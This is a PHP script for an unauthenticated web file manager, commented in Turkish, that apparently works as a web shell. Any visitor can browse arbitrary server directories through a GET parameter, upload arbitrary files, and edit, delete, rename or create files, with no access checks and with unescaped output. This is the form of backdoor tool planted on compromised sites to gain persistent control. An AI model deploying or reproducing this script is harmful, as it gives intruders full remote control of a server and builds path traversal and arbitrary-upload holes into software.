<?php
session_start();

// Hedef dizini al
$currentDir = isset($_GET['directory']) ? $_GET['directory'] : __DIR__;

// Dizin içeriğini göster
function listDirectoryContents($dir) {
    $items = array_diff(scandir($dir), ['.', '..']);
    echo "<h3>Directory: '$dir'</h3><ul>";
    foreach ($items as $item) {
        $fullPath = realpath("$dir/$item");
        $style = determineStyle($fullPath);
        $isDirectory = is_dir($fullPath);

        echo "<li style='$style'>";
        if ($isDirectory) {
            echo "<a href='?directory=$fullPath'>$item</a>";
        } else {
            echo "$item - 
                <a href='?directory=$dir&action=modify&file=$item'>Edit</a> | 
                <a href='?directory=$dir&action=remove&file=$item'>Delete</a> | 
                <a href='?directory=$dir&action=update&file=$item'>Rename</a>";
        }
        echo "</li>";
    }
    echo "</ul>";
}

// Dosya ve klasörler için stil belirle
function determineStyle($path) {
    if (is_readable($path) && is_writable($path)) {
        return "color: green;";
    } elseif (!is_writable($path)) {
        return "color: red;";
    }
    return "color: gray;";
}

// Dosya yükleme işlemi
function handleFileUpload($dir) {
    if (!empty($_FILES['uploadFile'])) {
        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($_FILES['uploadFile']['name']);
        if (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $targetPath)) {
            echo "<p>File uploaded!</p>";
        } else {
            echo "<p>File upload fail.</p>";
        }
    }
}

// Yeni klasör oluşturma
function createNewFolder($dir) {
    if (!empty($_POST['newFolder'])) {
        $folderPath = $dir . DIRECTORY_SEPARATOR . $_POST['newFolder'];
        if (!file_exists($folderPath)) {
            mkdir($folderPath);
            echo "<p>Folder created!</p>";
        } else {
            echo "<p>Folder already exists.</p>";
        }
    }
}

// Yeni dosya oluşturma
function createNewFile($dir) {
    if (!empty($_POST['newFile'])) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $_POST['newFile'];
        if (!file_exists($filePath)) {
            file_put_contents($filePath, '');
            echo "<p>File created!</p>";
        } else {
            echo "<p>File already exists.</p>";
        }
    }
}

// Mevcut dosyayı düzenleme
function modifyFile($path) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fileContent'])) {
        file_put_contents($path, $_POST['fileContent']);
        echo "<p>File saved!</p>";
    }

    $content = file_exists($path) ? htmlspecialchars(file_get_contents($path)) : '';
    echo "<form method='POST'>";
    echo "<textarea name='fileContent' style='width:100%; height:300px;'>$content</textarea><br>";
    echo "<button type='submit'>Save</button>";
    echo "</form>";
}

// Dosya silme
function removeFile($path) {
    if (file_exists($path)) {
        unlink($path);
        echo "<p>File deleted!</p>";
    }
}

// Dosya yeniden adlandırma
function updateFileName($path) {
    if (!empty($_POST['renameTo'])) {
        $newPath = dirname($path) . DIRECTORY_SEPARATOR . $_POST['renameTo'];
        rename($path, $newPath);
        echo "<p>File renamed!</p>";
    } else {
        echo "<form method='POST'>";
        echo "<input type='text' name='renameTo' placeholder='New Name'>";
        echo "<button type='submit'>Rename</button>";
        echo "</form>";
    }
}

// İşlemleri yönet
if (!empty($_GET['action']) && !empty($_GET['file'])) {
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['file'];
    switch ($_GET['action']) {
        case 'modify':
            modifyFile($filePath);
            break;
        case 'remove':
            removeFile($filePath);
            break;
        case 'update':
            updateFileName($filePath);
            break;
    }
}

// Form işlemlerini yönet
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['uploadFile'])) {
        handleFileUpload($currentDir);
    } elseif (!empty($_POST['newFolder'])) {
        createNewFolder($currentDir);
    } elseif (!empty($_POST['newFile'])) {
        createNewFile($currentDir);
    }
}

echo "<p>Current Directory: <strong>$currentDir</strong></p>";
echo "<a href='?directory=" . dirname($currentDir) . "'>Go Up</a>";

listDirectoryContents($currentDir);

// Dosya yükleme formu
echo "<h3>Upload File</h3>";
echo "<form method='POST' enctype='multipart/form-data'>";
echo "<input type='file' name='uploadFile'>";
echo "<button type='submit'>Upload</button>";
echo "</form>";

// Yeni klasör oluşturma formu
echo "<h3>Create Folder</h3>";
echo "<form method='POST'>";
echo "<input type='text' name='newFolder' placeholder='Folder Name'>";
echo "<button type='submit'>Create</button>";
echo "</form>";

// Yeni dosya oluşturma formu
echo "<h3>Create File</h3>";
echo "<form method='POST'>";
echo "<input type='text' name='newFile' placeholder='File Name'>";
echo "<button type='submit'>Create</button>";
echo "</form>";
?>